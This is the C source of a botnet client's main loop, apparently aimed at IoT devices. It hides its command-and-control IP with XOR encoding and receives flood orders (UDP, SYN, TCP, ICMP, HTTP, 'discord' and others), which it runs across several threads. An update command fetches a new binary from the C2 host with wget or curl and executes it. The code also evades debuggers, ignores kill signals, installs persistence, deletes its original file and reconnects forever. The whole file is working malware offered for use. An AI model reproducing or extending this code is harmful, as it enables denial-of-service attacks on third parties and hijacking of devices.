#define _GNU_SOURCE

#include "headers/attack_params.h"
#include "headers/daemon.h"
#include "headers/utils.h"
#include "headers/persistence.h"
#include <pthread.h>
#include <linux/limits.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <ctype.h>
#include <time.h>
#include <errno.h>
#include <stdint.h>

/* -----------------------------------------------------------------------
 * CNC address is XOR-encoded so `strings` / binwalk can't pull it out.
 * Key: 0x5A.  Change both _cnc_enc[] and _upd_enc[] when you change the IP.
 * t.me/keepspin
 * ----------------------------------------------------------------------- */
#define _XK 0x5A

/* "176.65.139.166" ^ 0x5A */
static const unsigned char _cnc_enc[] = {
    0x6B,0x6D,0x6C,0x74,0x6C,0x6F,0x74,0x6B,0x69,0x63,0x74,0x6B,0x6C,0x6C
};

/* "http://" ^ 0x5A (used as prefix; IP is appended at runtime) */
static const unsigned char _upd_pfx[] = {
    0x32,0x2E,0x2E,0x2A,0x60,0x75,0x75
};

static char _ip_buf[20]  = {0};
static char _upd_buf[32] = {0};

static const char *cnc_ip(void) {
    if (_ip_buf[0]) return _ip_buf;
    for (size_t i = 0; i < sizeof(_cnc_enc); i++)
        _ip_buf[i] = (char)(_cnc_enc[i] ^ _XK);
    _ip_buf[sizeof(_cnc_enc)] = '\0';
    return _ip_buf;
}

static const char *update_prefix(void) {
    if (_upd_buf[0]) return _upd_buf;
    for (size_t i = 0; i < sizeof(_upd_pfx); i++)
        _upd_buf[i] = (char)(_upd_pfx[i] ^ _XK);
    _upd_buf[sizeof(_upd_pfx)] = '\0';
    return _upd_buf;
}

#define BOT_PORT    54321
#define RETRY_DELAY 8

extern void udpplain_attack(attack_params *params);
extern void syn_attack(attack_params *params);
extern void udp_attack(attack_params *params);
extern void tcp_attack(attack_params *params);
extern void icmp_attack(attack_params *params);
extern void http_attack(attack_params *params);
extern void gre_attack(void *params);
extern void pps_attack(attack_params *params);
extern void udpbypass_attack(attack_params *params);
extern void discord_attack(attack_params *params);

/* Max attack threads — capped so weak IoT devices don't thrash */
#define MAX_ATTACK_THREADS 8

static pthread_t     running_attack_tids[MAX_ATTACK_THREADS];
static int           running_attack_nthreads = 0;
static attack_params running_attack_params = {0};


static void handle_command(const char *cmd, int sock) {
    if (!cmd || !*cmd) return;
    
    if (strncmp(cmd, "stop", 4) == 0 && (cmd[4] == 0 || cmd[4] == ' ')) {
        if (running_attack_nthreads > 0) {
            running_attack_params.active = 0;
            for (int i = 0; i < running_attack_nthreads; i++)
                pthread_join(running_attack_tids[i], NULL);
            running_attack_nthreads = 0;
        }
        return;
    }
    
    if (strncmp(cmd, ".kill", 5) == 0 && (cmd[5] == 0 || cmd[5] == ' ')) {
        killpg(getpgrp(), SIGKILL);
        return;
    }
    
    if ((strncmp(cmd, ".update", 7) == 0 || strncmp(cmd, "!update", 7) == 0) &&
        (cmd[7] == 0 || cmd[7] == ' ')) {

        /* URL: http://<cnc_ip>/iran.ARCH  — built from decoded components at runtime */
        char url[512];
        snprintf(url, sizeof(url), "%s%s/iran.%s", update_prefix(), cnc_ip(), get_arch());

        /* Download target: persistent install path or /tmp fallback */
        const char *install = get_persistent_path();
        char tmp_path[256];
        if (!install || install[0] == '\0') {
            snprintf(tmp_path, sizeof(tmp_path), "/tmp/iran.%s", get_arch());
            install = tmp_path;
        }

        /* Download via wget, fallback curl.
           Buffer: 2x path (max 256) + 2x URL (max 512) + cmd overhead ~60 = ~1596 bytes.
           Use 2048 so GCC -Wformat-truncation is satisfied. */
        char dl_cmd[2048];
        snprintf(dl_cmd, sizeof(dl_cmd),
            "wget -q -O '%s' '%s' 2>/dev/null || "
            "curl -s -o '%s' '%s' 2>/dev/null",
            install, url, install, url);

        if (system(dl_cmd) == 0 && access(install, F_OK) == 0) {
            chmod(install, 0755);
            char *new_argv[] = {(char *)install, NULL};
            execv(install, new_argv); /* replaces process with new binary */
        }
        return;
    }

    if (strncmp(cmd, "ping", 4) == 0 && (cmd[4] == 0 || cmd[4] == ' ')) {
        char pong[32];
        int len = snprintf(pong, sizeof(pong), "pong %s", get_arch());
        send(sock, pong, len > 0 ? len : 4, MSG_NOSIGNAL);
        return;
    }
    
    char type_buf[32], ip_buf[256], port_buf[8], time_buf[12], argstr[512];
    argstr[0] = '\0';
    int nargs = sscanf(cmd, "%31s %255s %7s %11s", type_buf, ip_buf, port_buf, time_buf);
    if (nargs < 4) return;

    /* grab everything after the 4th token as optional args */
    {
        const char *p = cmd;
        int spaces = 0;
        while (*p && spaces < 4) {
            while (*p && *p != ' ') p++;   /* skip token */
            while (*p == ' ') p++;          /* skip spaces */
            spaces++;
        }
        if (*p) {
            strncpy(argstr, p, sizeof(argstr) - 1);
            argstr[sizeof(argstr) - 1] = '\0';
            /* strip trailing \r\n */
            size_t alen = strlen(argstr);
            while (alen > 0 && (argstr[alen-1] == '\r' || argstr[alen-1] == '\n'))
                argstr[--alen] = '\0';
        }
    }
    
    char *type = type_buf;
    // Convert ! prefix to . for command type
    if (type[0] == '!') {
        type[0] = '.';
    }
    
    int port = atoi(port_buf);
    int dur = atoi(time_buf);
    if (port <= 0 || port > 65535 || dur <= 0) return;
    
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    if (inet_pton(AF_INET, ip_buf, &sin.sin_addr) <= 0) return;

    attack_params params;
    memset(&params, 0, sizeof(params));
    params.target_addr = sin;
    params.duration = dur;
    params.len     = 512;
    params.len_min = 512;
    params.len_max = 512;
    params.active  = 1;

    if (argstr[0] != '\0') {
        char *saveptr;
        char argcopy[256];
        strncpy(argcopy, argstr, sizeof(argcopy) - 1);
        argcopy[sizeof(argcopy) - 1] = '\0';
        char *tok = strtok_r(argcopy, " ", &saveptr);
        while (tok) {
            if (strncmp(tok, "len=", 4) == 0) {
                const char *val = tok + 4;
                char *dash = strchr(val, '-');
                if (dash && dash != val) {
                    int lmin = atoi(val), lmax = atoi(dash + 1);
                    if (lmin >= 1 && lmax <= 1500 && lmin <= lmax) {
                        params.len_min = (uint16_t)lmin;
                        params.len_max = (uint16_t)lmax;
                        params.len     = (uint16_t)lmin;
                    }
                } else {
                    int lval = atoi(val);
                    if (lval >= 1 && lval <= 1500) {
                        params.len = params.len_min = params.len_max = (uint16_t)lval;
                    }
                }
            }
            tok = strtok_r(NULL, " ", &saveptr);
        }
    }

    /* accept all known methods */
    void (*func)(attack_params*) = NULL;
    if (strcmp(type, "udpplain") == 0 || strcmp(type, ".udpplain") == 0)
        func = udpplain_attack;
    else if (strcmp(type, "syn") == 0 || strcmp(type, ".syn") == 0)
        func = syn_attack;
    else if (strcmp(type, "udp") == 0 || strcmp(type, ".udp") == 0)
        func = udp_attack;
    else if (strcmp(type, "tcp") == 0 || strcmp(type, ".tcp") == 0)
        func = tcp_attack;
    else if (strcmp(type, "icmp") == 0 || strcmp(type, ".icmp") == 0)
        func = icmp_attack;
    else if (strcmp(type, "http") == 0 || strcmp(type, ".http") == 0)
        func = http_attack;
    else if (strcmp(type, "pps") == 0 || strcmp(type, ".pps") == 0)
        func = pps_attack;
    else if (strcmp(type, "udpbypass") == 0 || strcmp(type, ".udpbypass") == 0)
        func = udpbypass_attack;
    else if (strcmp(type, "discord") == 0 || strcmp(type, ".discord") == 0)
        func = discord_attack;
    if (!func) return;

    
    if (running_attack_nthreads > 0) {
        running_attack_params.active = 0;
        for (int i = 0; i < running_attack_nthreads; i++)
            pthread_join(running_attack_tids[i], NULL);
        running_attack_nthreads = 0;
    }

    running_attack_params = params;

    /* Spawn one thread per logical CPU core for max throughput.
       Each thread has its own socket, so there's no lock contention. */
    int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu < 1) ncpu = 1;
    if (ncpu > MAX_ATTACK_THREADS) ncpu = MAX_ATTACK_THREADS;

    running_attack_nthreads = 0;
    for (int i = 0; i < ncpu; i++) {
        pthread_t tid;
        if (pthread_create(&tid, NULL, (void*(*)(void*))func, &running_attack_params) == 0) {
            running_attack_tids[running_attack_nthreads++] = tid;
        }
    }
}

/* Catch (but ignore) all soft-kill signals.
   SIGKILL and SIGSTOP are unblockable, but SIGTERM/SIGHUP/SIGQUIT are not. */
static void _sig_nop(int s) { (void)s; }

int main(int argc, char** argv) {
    /* Block every catchable termination signal before any thread is spawned. */
    signal(SIGPIPE,  SIG_IGN);
    signal(SIGTERM,  _sig_nop);
    signal(SIGHUP,   _sig_nop);
    signal(SIGQUIT,  _sig_nop);
    signal(SIGUSR1,  _sig_nop);
    signal(SIGUSR2,  _sig_nop);
    signal(SIGINT,   _sig_nop);

    /* Anti-analysis: if a tracer (strace/gdb/ptrace) is attached at startup,
       exit silently — do NOT let the analyst watch the connection attempt. */
    {
        FILE *sf = fopen("/proc/self/status", "r");
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "TracerPid:", 10) == 0) {
                    if (atoi(line + 10) != 0) { fclose(sf); _exit(0); }
                    break;
                }
            }
            fclose(sf);
        }
    }

    daemonize(argc, argv);
    
    /* install into a persistent location, register autostart, fork watchdog */
    persistence_init();
    persistence_watchdog_start();
    
    /* delete original binary (the copy at persistent_path is the real one now) */
    {
        char self_path[PATH_MAX];
        ssize_t plen = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
        if (plen > 0) {
            self_path[plen] = 0;
            const char *pp = get_persistent_path();
            /* only unlink if we actually moved to a different location */
            if (!pp || strcmp(self_path, pp) != 0)
                unlink(self_path);
        }
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BOT_PORT);
    server_addr.sin_addr.s_addr = inet_addr(cnc_ip());
    
    char group[64] = "default";
    if (argc > 1) {
        strncpy(group, argv[1], sizeof(group)-1);
        group[sizeof(group)-1] = 0;
    }
    
    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            /* socket() failing means kernel resource exhaustion — back off, never exit */
            sleep(RETRY_DELAY);
            continue;
        }
        
        int opt = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
        
        /* keepalive — survives NAT table expiry on IoT routers (~30-60s idle kill) */
        setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));
        int ka_idle = 20;   /* start probes after 20s idle          */
        int ka_intvl = 5;   /* probe every 5s                       */
        int ka_cnt = 3;     /* 3 missed probes → dead               */
        setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE,  &ka_idle,  sizeof(ka_idle));
        setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &ka_intvl, sizeof(ka_intvl));
        setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT,   &ka_cnt,   sizeof(ka_cnt));
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) != 0) {
            /* CNC unreachable — keep retrying forever, never die */
            close(sock);
            sleep(RETRY_DELAY);
            continue;
        }
        
        const char *arch = get_arch();
        char idmsg[128];
        int msglen = snprintf(idmsg, sizeof(idmsg), "%s %s", arch, group);
        if (msglen > 0) send(sock, idmsg, msglen, MSG_NOSIGNAL);
        
        /* cmd buffer matches CNC MAX_COMMAND_LENGTH (4096).
           Old 512-byte buffer silently truncated attack commands with many args. */
        char cmd[4096];
        struct timeval tv;
        time_t last_health = time(NULL);
        while (1) {
            fd_set readfds;
            tv.tv_sec = 60;   /* shorter window so health check fires regularly */
            tv.tv_usec = 0;
            FD_ZERO(&readfds);
            FD_SET(sock, &readfds);
            
            int sel = select(sock+1, &readfds, NULL, NULL, &tv);

            /* Periodic persistence health check — inotify was set up but never polled */
            time_t now = time(NULL);
            if (now - last_health >= 60) {
                persistence_check_health();
                last_health = now;
            }

            if (sel == 0) continue;   /* timeout = idle, NOT an error — stay connected */
            if (sel < 0) break;       /* real select error → reconnect               */
            
            ssize_t n = recv(sock, cmd, sizeof(cmd)-1, MSG_NOSIGNAL);
            if (n <= 0) break;        /* server closed or real recv error            */
            
            cmd[n] = 0;
            handle_command(cmd, sock);
        }
        
        close(sock);
        /* jitter reconnect: 3-8s random — prevents mass CNC hammering on simultaneous drops */
        sleep(3 + (rand() % 6));
    }
    return 0;
}
